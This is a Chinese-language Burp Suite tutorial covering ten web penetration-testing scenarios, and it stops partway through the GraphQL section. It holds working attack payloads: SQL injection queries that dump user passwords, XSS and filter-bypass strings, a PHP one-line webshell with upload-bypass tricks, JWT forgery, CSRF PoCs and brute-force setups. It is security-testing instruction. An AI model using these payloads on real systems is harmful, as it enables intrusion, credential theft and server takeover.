# Burp Suite 实战使用场景示例

> 本文整理了 Burp Suite 在 Web 安全测试中的实战使用场景和完整操作流程。

---

## 场景一：SQL 注入检测与利用

### 目标
发现并利用 Web 应用中的 SQL 注入漏洞。

### 操作流程

**步骤一：发现注入点**
```
1. 开启 Burp 代理，浏览目标网站
2. 找到带有参数的页面（?id=1, /page?id=1 等）
3. 在参数值后加单引号：?id=1'
4. 观察响应变化：
   - 页面报错 → 可能有报错注入
   - 页面内容变化 → 可能有布尔盲注
   - 页面加载变慢 → 可能有时间盲注
5. 将请求发送到 Repeater (Ctrl+R)
```

**步骤二：判断注入类型**
```
在 Repeater 中测试：
1. 布尔盲注测试：
   - ?id=1 and 1=1 → 正常页面
   - ?id=1 and 1=2 → 异常页面
   
2. 报错注入测试：
   - ?id=1' → 报错信息
   - 查看报错中是否有 SQL 语句
   
3. 时间盲注测试：
   - ?id=1 and sleep(5) → 延迟 5 秒
   
4. 联合查询测试：
   - ?id=1 order by 10 → 判断列数
   - ?id=-1 union select 1,2,3 → 查看回显位置
```

**步骤三：获取数据**
```
如果是联合查询注入：
1. 获取数据库名：
   ?id=-1 union select 1,database(),3
   
2. 获取表名：
   ?id=-1 union select 1,group_concat(table_name),3
   from information_schema.tables where table_schema=database()
   
3. 获取列名：
   ?id=-1 union select 1,group_concat(column_name),3
   from information_schema.columns where table_name='users'
   
4. 获取数据：
   ?id=-1 union select 1,username,password from users
```

**步骤四：使用 Intruder 自动化**
```
1. 发送请求到 Intruder
2. 标记注入参数位置
3. Attack type: Sniper
4. Payload type: Simple list
5. 加载 SQL 注入 Payload 字典
6. Start attack
7. 根据响应长度/状态码判断哪些 Payload 有效
```

**步骤五：使用 SQLiPy 插件**
```
1. 安装 SQLiPy 插件
2. 右键请求 → SQLiPy → SQLMap scan
3. 配置 sqlmap 参数
4. 开始扫描
5. 查看扫描结果
```

## 场景二：XSS 跨站脚本攻击测试

### 目标
发现并验证 Web 应用中的 XSS 漏洞。

### 操作流程

**步骤一：寻找输入点**
```
1. 浏览网站，找到所有用户输入的地方：
   - URL 参数
   - 表单输入（搜索框、留言、评论等）
   - Cookie
   - HTTP Header（User-Agent、Referer 等）
   - 文件上传（文件名）
2. 在输入点输入测试字符串：test123
3. 查看响应中 test123 出现的位置
```

**步骤二：判断输出位置和上下文**
```
1. 输入：<>"'()test
2. 在 Repeater 中发送请求
3. 查看响应中输出的位置：
   - HTML 标签之间：<div>输出</div>
   - HTML 属性中：<input value="输出">
   - JavaScript 中：<script>var x = "输出"</script>
   - URL 中：window.location = "输出"
4. 判断哪些字符被过滤/转义
```

**步骤三：构造 Payload**
```
根据不同上下文构造 Payload：

1. HTML 标签之间：
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
   
2. HTML 属性中：
   "><script>alert(1)</script>
   " onmouseover="alert(1)
   
3. JavaScript 中：
   ";alert(1);//
   '-alert(1)-'
   
4. URL 上下文：
   javascript:alert(1)
```

**步骤四：绕过过滤**
```
常见绕过技巧：

1. 大小写绕过：
   <SCRIPT>alert(1)</SCRIPT>
   <ImG sRc=x oNeRrOr=alert(1)>

2. 编码绕过：
   URL 编码：%3Cscript%3Ealert(1)%3C/script%3E
   HTML 实体：&#60;script&#62;...&#60;/script&#62;
   Unicode 编码

3. 事件注入：
   <img src=x onerror=alert(1)>
   <body onload=alert(1)>
   <svg onload=alert(1)>

4. 伪协议：
   <iframe src="javascript:alert(1)">
   <a href="javascript:alert(1)">click</a>

5. 标签绕过：
   用 <script> 被过滤时用 <img> <svg> <body> 等
```

**步骤五：验证与利用**
```
1. 在浏览器中验证（使用 Render 视图）
2. 构造可利用的 Payload：
   - 窃取 Cookie：document.cookie
   - 钓鱼：伪造登录页面
   - 键盘记录
   - CSRF 配合
3. 报告漏洞，包含可复现的 PoC
```

## 场景三：越权漏洞检测

### 目标
检测 Web 应用中的水平越权和垂直越权漏洞。

### 操作流程

**步骤一：准备测试账号**
```
需要至少两个账号：
- 低权限账号 A（普通用户）
- 高权限账号 B（管理员）

或两个同级账号：
- 用户 A（ID: 1001）
- 用户 B（ID: 1002）
```

**步骤二：收集功能 API**
```
1. 使用账号 A 登录
2. 浏览所有功能模块
3. 记录所有 API 请求（URL、方法、参数）
4. 重点关注：
   - 个人信息接口：/api/user/1001
   - 订单接口：/api/order?id=xxx
   - 管理后台接口：/admin/...
   - 文件下载接口：/download?file=xxx
```

**步骤三：手工测试越权**
```
水平越权测试：
1. 用户 A 访问自己的数据：GET /api/user/1001
2. 修改 ID 为用户 B 的 ID：GET /api/user/1002
3. 如果能看到用户 B 的数据 → 存在水平越权

垂直越权测试：
1. 普通用户访问管理接口：GET /admin/users
2. 如果能看到用户列表 → 存在垂直越权

未授权访问测试：
1. 去掉 Cookie/Token
2. 访问需要登录的接口
3. 如果能正常访问 → 存在未授权访问
```

**步骤四：使用 Autorize 插件自动化**
```
1. 安装 Autorize 插件
2. 配置低权限 Cookie/Header：
   - 在 Autorize Configuration 中设置
   - 输入低权限用户的 Cookie 或 Token
3. 开启 Autorize（Intercept is on）
4. 使用高权限账号正常浏览网站
5. Autorize 会自动用低权限 Cookie 重放每个请求
6. 查看结果：
   - 红色：未授权（可能存在越权）
   - 绿色：授权正常
   - 橙色：需要人工确认
```

**步骤五：深入验证**
```
1. 将疑似越权的请求发送到 Repeater
2. 替换不同用户的 Cookie/Token
3. 对比响应内容
4. 确认是否能访问/修改他人数据
5. 记录漏洞详情和 PoC
```

## 场景四：文件上传漏洞测试

### 目标
检测文件上传功能是否存在安全漏洞，能否上传 WebShell。

### 操作流程

**步骤一：定位上传点**
```
1. 找到文件上传功能：
   - 头像上传
   - 附件上传
   - 图片上传
   - 文档上传
2. 拦截上传请求
3. 发送到 Repeater
```

**步骤二：基础测试**
```
1. 上传正常文件（如 jpg 图片）
   - 观察请求格式（multipart/form-data）
   - 查看上传后文件的 URL
   - 记录文件保存路径

2. 上传 PHP 文件测试
   - 修改文件名：shell.php
   - 内容：<?php phpinfo(); ?>
   - 查看响应：是否被拦截
   - 如果成功上传，访问文件 URL
```

**步骤三：绕过黑名单检测**
```
使用 Intruder 批量测试后缀名：

1. 发送上传请求到 Intruder
2. 标记文件名中的后缀部分
3. Payload 列表（常见绕过后缀）：
   .php
   .php3
   .php4
   .php5
   .phtml
   .phar
   .pht
   .PHP
   .Php
   .pHp
   .php%00.jpg
   .shell.php.jpg
   .phphpp (双写绕过)

4. 观察每个后缀的响应差异
5. 找到可以成功上传并执行的后缀
```

**步骤四：绕过 MIME 类型检测**
```
1. 修改 Content-Type：
   Content-Type: image/jpeg
   Content-Type: image/png
   Content-Type: image/gif

2. 同时修改文件内容开头：
   添加文件头：GIF89a
   或：FFD8FF（JPEG 文件头）

3. 制作图片马：
   图片内容 + PHP 代码
   例：GIF89a<?php @eval($_POST['cmd']); ?>
```

**步骤五：绕过其他检测**
```
1. 二次渲染绕过：
   - 上传正常图片，抓包
   - 查看二次渲染后的图片
   - 在图片某些区域插入代码

2. .htaccess 绕过：
   - 上传 .htaccess 文件
   - 内容：AddType application/x-httpd-php .jpg
   - 然后上传 .jpg 的 PHP 代码

3. 解析漏洞：
   - Apache：shell.php.jpg（某些配置下会解析为 PHP）
   - IIS：shell.asp;xx.jpg
   - Nginx：shell.jpg%00.php
```

**步骤六：获取 WebShell**
```
1. 确认上传的文件可执行
2. 上传一句话木马：
   <?php @eval($_POST['cmd']); ?>
   <?php @assert($_POST['cmd']); ?>
   
3. 使用菜刀/蚁剑连接
4. 或在 Repeater 中测试命令执行：
   POST /uploads/shell.php
   Content-Type: application/x-www-form-urlencoded
   
   cmd=phpinfo();
```

## 场景五：JWT 安全测试

### 目标
检测 JWT（JSON Web Token）认证机制中的安全漏洞。

### 操作流程

**步骤一：识别 JWT**
```
1. 拦截请求，查看 Authorization 头：
   Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
   
2. 或查看 Cookie 中的 JWT

3. 使用 Burp 的 JSON Web Token 插件解码
   或使用 jwt.io 在线解码

4. JWT 结构：
   Header.Payload.Signature
   各部分用 Base64URL 编码
```

**步骤二：测试 None 算法绕过**
```
1. 将 Header 中的 alg 改为 none：
   {"alg":"none","typ":"JWT"}

2. 修改 Payload 中的用户信息：
   {"sub":"admin","role":"admin"}

3. 签名部分留空

4. 构造新的 JWT：
   base64(header).base64(payload).

5. 发送请求，验证是否以管理员身份访问
```

**步骤三：测试算法混淆攻击**
```
1. 将 alg 从 RS256 改为 HS256
2. 使用公钥作为密钥进行签名
3. 构造新的 JWT
4. 发送请求测试

注意：需要先获取公钥
获取方式：
   - 证书中提取
   - JWKS 端点：/.well-known/jwks.json
   - 其他信息泄露
```

**步骤四：测试密钥泄露/弱密钥**
```
1. 如果是 HS256 对称加密
2. 使用 JWT cracker 工具爆破密钥
3. 使用常见弱口令字典
4. 如果爆破成功，可伪造任意 Token
```

**步骤五：其他 JWT 漏洞测试**
```
1. 测试 Token 是否可重复使用（无过期时间）
2. 测试修改 Payload 后签名是否验证
3. 测试 kid 参数注入（密钥选择攻击）
4. 测试 jku 参数注入（JSON Web Key Set URL）
```

## 场景六：CSRF 漏洞测试

### 目标
检测 Web 应用是否存在 CSRF（跨站请求伪造）漏洞。

### 操作流程

**步骤一：识别关键操作**
```
找到敏感操作的 API：
- 修改密码
- 转账
- 修改个人信息
- 删除账号
- 管理操作（增删改）
```

**步骤二：检查 CSRF Token**
```
1. 拦截请求，查看是否有 CSRF Token：
   - 请求参数中：csrf_token=xxx
   - 请求头中：X-CSRF-Token: xxx
   
2. 测试：
   - 去掉 CSRF Token，请求是否成功
   - 修改 Token 为错误值，请求是否成功
   - Token 是否固定不变
   - Token 是否可预测
```

**步骤三：构造 CSRF PoC**
```
如果没有 CSRF 防护，构造 PoC：

1. GET 型 CSRF：
   <img src="http://target.com/change_password?new=123456">

2. POST 型 CSRF：
   <form action="http://target.com/change_password" method="POST">
     <input type="hidden" name="password" value="123456">
   </form>
   <script>document.forms[0].submit();</script>

3. JSON 型 CSRF：
   使用 fetch 或 XMLHttpRequest 发送
   （需要目标不验证 Content-Type）
```

**步骤四：验证漏洞**
```
1. 用户已登录目标网站
2. 用户访问攻击者构造的页面
3. 检查操作是否被执行
4. 如果执行成功 → 存在 CSRF 漏洞
```

## 场景七：暴力破解测试

### 目标
对登录接口等进行暴力破解测试。

### 操作流程

**步骤一：分析登录机制**
```
1. 拦截登录请求
2. 分析：
   - 请求方法（POST/GET）
   - 参数位置（Body/Header/JSON）
   - 是否有验证码
   - 是否有次数限制
   - 错误信息是否有差异（用户名枚举）
```

**步骤二：用户名枚举**
```
1. 发送请求到 Intruder
2. 标记 username 参数
3. Attack type: Sniper
4. Payload: 用户名字典
5. Start attack
6. 观察响应：
   - 用户名存在："密码错误"
   - 用户名不存在："用户名不存在"
   - 长度/状态码差异
```

**步骤三：密码爆破**
```
1. 标记 password 参数
2. Attack type: Sniper
3. Payload: 密码字典
4. Options：
   - Threads: 5-20（根据目标承受能力）
   - 失败重试：0
   - 超时：10000ms
5. Start attack
6. 按 Length/Status 排序找异常
7. 验证成功的密码
```

**步骤四：验证码绕过测试**
```
1. 测试验证码是否可重复使用
2. 测试空验证码是否通过
3. 测试修改验证码参数
4. 测试验证码是否可预测
5. 使用验证码识别工具（如 tesseract）
```

**步骤五：Token 爆破（Token 登录）**
```
1. 如果是 Token 认证
2. 在 Intruder 中标记 Token 位置
3. 使用密码字典生成 Token（如果知道算法）
4. 或爆破 session ID
```

## 场景八：移动应用抓包测试

### 目标
对 Android/iOS 移动应用进行抓包测试。

### 操作流程

**步骤一：配置抓包环境**
```
1. Burp 设置：
   Proxy settings → Proxy Listeners → Add
   Bind to port: 8080
   Bind to address: All interfaces
   
2. 手机设置：
   - 连接到与电脑同一 WiFi
   - WiFi 设置 → 代理 → 手动
   - 代理主机：电脑 IP
   - 代理端口：8080
   
3. 安装证书：
   - 手机浏览器访问 http://burp
   - 下载 CA 证书
   - 安装证书
```

**步骤二：Android 7.0+ 证书问题**
```
问题：Android 7.0+ 默认不信任用户证书

解决方案：

1. Root + 系统证书安装：
   - 将证书放到 /system/etc/security/cacerts/
   - 或使用 Magisk 模块（Move Certificates）

2. Frida + Objection 绕过 SSL Pinning：
   # 安装工具
   pip install frida-tools objection
   
   # 启动 objection
   objection -g com.example.app explore
   
   # 禁用 SSL Pinning
   android sslpinning disable

3. 使用模拟器 + Xposed + JustTrustMe
```

**步骤三：抓包与测试**
```
1. 打开 App，正常操作
2. Burp 中查看 HTTP history
3. 分析 API 接口
4. 发送到 Repeater 测试漏洞
5. 常见测试点：
   - 登录接口（暴力破解、验证码绕过）
   - 用户信息接口（越权）
   - 支付接口（金额修改）
   - 上传接口（文件上传漏洞）
```

**步骤四：绕过 SSL Pinning**
```
方法一：Frida 脚本
   frida -U -f com.example.app -l ssl_pinning_bypass.js --no-pause

方法二：Objection
   objection -g com.example.app explore
   android sslpinning disable

方法三：Xposed + JustTrustMe / TrustMeAlready

方法四：修改 App 源码（反编译 + 修改 + 重打包）
```

## 场景九：WebSocket 安全测试

### 目标
对 WebSocket 连接进行安全测试。

### 操作流程

**步骤一：识别 WebSocket 连接**
```
1. Burp 中查看：
   Proxy → HTTP history → 筛选 Upgrade 头
   或 WebSockets history 标签

2. WebSocket 握手请求特征：
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: xxx
   Sec-WebSocket-Version: 13
```

**步骤二：拦截与修改**
```
1. Proxy → Intercept → Intercept WebSockets: on
2. 在 App/页面中触发 WebSocket 消息
3. Burp 拦截消息
4. 修改消息内容
5. Forward 发送
```

**步骤三：安全测试**
```
1. 认证测试：
   - 去掉 Cookie/Token，能否连接
   - 修改用户 ID，能否接收他人消息
   
2. 输入验证测试：
   - 注入 XSS Payload
   - 注入 SQL 注入 Payload
   - 注入命令执行 Payload
   
3. 权限测试：
   - 普通用户能否接收管理员消息
   - 能否向其他用户发送消息
   
4. 重放测试：
   - 捕获消息后重放
   - 是否重复执行操作
```

**步骤四：使用 Repeater 测试**
```
1. 右键 WebSocket 消息 → Send to Repeater
2. 在 Repeater 中修改消息
3. Send 发送
4. 查看响应
```

## 场景十：GraphQL 安全测试

### 目标
对 GraphQL API 进行安全测试。

### 操作流程

**步骤一：发现 GraphQL 端点**
```
常见路径：
   /graphql
   /api/graphql
   /v1/graphql
   /graphql/v1
   /query

特征：
   - Content-Type: application/json
   - 请求体包含 query 变量
   - 错误信息含 GraphQL 关键字
```

**步骤二：内省查询**
```
获取完整的 GraphQL Schema：

POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ __schema { types { name fields { name type { name } } } } }"
}

或更详细的：
{
  "query": "query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      types { ...FullType }
    }
  }"
}
```

**步骤三：安全测试**
```
1. 认证测试：
   - 去掉 Token 能否查询
   - 普通用户能否查询所有数据
   
2. 注入测试：
   - SQL 注入（通过变量）
   - NoSQL 注入
   - 命令注入
   
3. 拒绝服务测试：
   - 深度递归查询
   - 批量查询
   - 大量字段查询
   
4. 信息泄露：
```
